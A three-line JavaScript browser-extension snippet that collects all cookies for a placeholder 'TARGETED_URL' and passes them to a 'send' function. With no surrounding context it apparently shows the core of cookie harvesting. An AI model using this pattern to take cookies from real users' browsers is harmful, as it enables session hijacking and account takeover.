chrome.cookies.getAll({ url: TARGETED_URL }, function(cookies) {
	send(cookies);
});